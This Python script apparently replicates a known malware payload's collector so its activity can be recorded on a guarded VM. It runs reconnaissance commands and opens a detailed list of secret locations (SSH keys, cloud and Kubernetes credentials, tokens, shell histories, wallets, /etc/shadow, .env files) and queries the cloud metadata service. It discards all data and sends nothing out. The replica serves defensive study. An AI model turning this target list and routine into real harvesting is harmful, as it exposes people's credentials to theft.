# The payload's collector, re-implemented from the public write-ups
# (../../../README.md): the commands it runs to learn the machine and the
# files it opens, as they name them. Everything read is dropped where it is
# read: nothing is printed, kept or passed on.
#
# It runs only on a recording VM, and stops at once anywhere else.
import glob
import ipaddress
import os
import socket
import subprocess
import sys
import urllib.request

HOST = "models.acme-tokens.example"
PRIVATE = [ipaddress.ip_network(n) for n in ("10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")]
HOME = os.path.expanduser("~")


# The same guard as _start.py: this file is run as a script of its own.
def guard():
    if not os.path.exists("/etc/tangent-eval-vm"):
        sys.exit(0)
    try:
        address = ipaddress.ip_address(socket.gethostbyname(HOST))
    except (OSError, ValueError):
        sys.exit(0)
    if not any(address in net for net in PRIVATE):
        sys.exit(0)


def read(path):
    try:
        with open(path, "rb") as fh:
            fh.read()
    except OSError:
        pass


def sh(cmd):
    try:
        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
    except subprocess.SubprocessError:
        pass


guard()

# 1. The machine and the environment, by the shell.
sh("hostname; pwd; whoami; uname -a; ip addr 2>/dev/null || ifconfig 2>/dev/null; ip route 2>/dev/null")
sh("printenv")

# 2. The files in the home directory that the write-ups list: SSH, git, the
#    clouds, Kubernetes, Docker, package and database tokens, shell
#    histories, wallets. Most are not on this Mac; each is tried.
for p in [".ssh/id_rsa", ".ssh/id_ed25519", ".ssh/id_ecdsa", ".ssh/id_dsa", ".ssh/authorized_keys", ".ssh/known_hosts",
          ".ssh/config", ".git-credentials", ".gitconfig", ".aws/credentials", ".aws/config", ".kube/config",
          ".config/gcloud/application_default_credentials.json", ".docker/config.json", ".npmrc", ".vault-token",
          ".netrc", ".pgpass", ".mongorc.js", ".my.cnf", ".msmtprc", ".bash_history", ".zsh_history",
          ".mysql_history", ".psql_history", ".rediscli_history", ".bitcoin/bitcoin.conf"]:
    read(os.path.join(HOME, p))
if os.environ.get("GOOGLE_APPLICATION_CREDENTIALS"):
    read(os.environ["GOOGLE_APPLICATION_CREDENTIALS"])
for root, _, files in os.walk(os.path.join(HOME, ".azure")):
    for f in files:
        read(os.path.join(root, f))
for pattern in [".bitcoin/wallet*.dat", ".ethereum/keystore/*", ".config/solana/*.json"]:
    for p in glob.glob(os.path.join(HOME, pattern)):
        read(p)

# 3. The system's own: accounts, Kubernetes on a node or in a pod, Docker's
#    and the TLS keys. Linux paths; on a Mac only /etc/passwd is there.
for p in ["/etc/passwd", "/etc/shadow", "/etc/environment", "/etc/kubernetes/admin.conf",
          "/var/run/secrets/kubernetes.io/serviceaccount/token", "/kaniko/.docker/config.json",
          "/root/.docker/config.json", "/var/log/auth.log", "/var/log/secure"]:
    read(p)
for p in glob.glob("/etc/ssh/ssh_host_*_key") + glob.glob("/etc/ssl/private/*.key"):
    read(p)

# 4. Environment files: the working directory's, then the roots the
#    write-ups give, six levels down.
ENV = {".env", ".env.local", ".env.production", ".env.development", ".env.staging"}
for name in sorted(ENV):
    read(name)
for top in ["/home", "/opt", "/app", "/data", "/var/www"]:
    for root, dirs, files in os.walk(top):
        if root[len(top):].count(os.sep) >= 5:
            dirs[:] = []
        for f in files:
            if f in ENV:
                read(os.path.join(root, f))

# 5. The cloud's metadata service, asked for a token as on an EC2 instance.
#    On a Mac nothing answers.
try:
    urllib.request.urlopen(urllib.request.Request("http://169.254.169.254/latest/api/token", method="PUT", headers={
        "X-aws-ec2-metadata-token-ttl-seconds": "21600"}), timeout=2).read()
except OSError:
    pass
